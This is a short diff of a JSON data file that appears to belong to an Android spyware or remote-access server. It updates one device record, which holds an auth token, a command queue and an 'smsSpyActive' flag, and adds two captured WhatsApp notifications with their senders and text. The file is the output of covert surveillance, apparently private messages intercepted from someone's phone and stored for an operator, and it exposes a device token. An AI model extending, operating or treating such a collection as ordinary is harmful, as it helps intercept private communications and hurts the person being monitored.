@@ -1245,7 +1245,7 @@
     "deviceName": "HP-FREE-A487",
     "ownerUsername": "rian",
     "token": "77751522caef94e9c9f1117d03601776",
-    "lastSeen": 1775189148669,
+    "lastSeen": 1775189151694,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T03:51:21.437Z",
@@ -1261,6 +1261,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB¹||STOK AKUN BEBE STR (20 pesan): bebe",
+        "content": "📷 OP?170++,LOG GGL,DATA AMAN\n-BERGARANSI 30H✅\n-ALL AMAN✅",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189153500
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB¹||STOK AKUN BEBE STR",
+        "content": "‎19 pesan baru",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189151063
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB¹||STOK AKUN BEBE STR (19 pesan): bebe",
